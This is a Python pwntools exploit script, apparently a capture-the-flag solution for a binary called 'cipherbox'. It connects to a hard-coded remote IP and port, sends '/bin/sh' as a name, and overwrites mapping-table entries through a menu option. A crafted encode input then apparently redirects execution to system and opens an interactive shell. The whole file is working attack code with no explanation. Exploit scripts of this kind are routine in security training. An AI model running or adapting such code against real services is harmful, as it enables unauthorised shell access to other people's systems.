#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('cipherbox_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*set_mapping+38
        # b*do_encode+266
        # b*0x004016C8   
        # b*0x004015DE    
        # b*0x401686  
        b*0x04019A0 
        b*do_encode+273
        # b*0x4015F3 
        # b*do_set
        b*0x401415 
        c
        ''')
        sleep(1)

#  nc 67.223.119.69 3647 
if args.REMOTE:
    p = remote('67.223.119.69',3647 )
    # p = remote('0', 1337)
else:
    p = process([exe.path])

sla(b'Name: ', b'/bin/sh')
# 04012E9   
def do_set(idx, value):
    slna(b'>> ', 1)
    slna(b'  From (0-255): ', idx)
    slna(b'  To   (0-255): ', value)
GDB()
#######################################
##### way 1 ##########
do_set(1, 0x73)
do_set(2, 0x68)
# do_set(255-7, 0x14)
# do_set(255-6, 0x11)
do_set(240, 0x14)
do_set(241, 0x11)

slna(b'>> ', 3)
sla(b'Text: ', p16(0x0201))
print(hex(exe.plt.system))
#######################################

######################################

p.interactive()
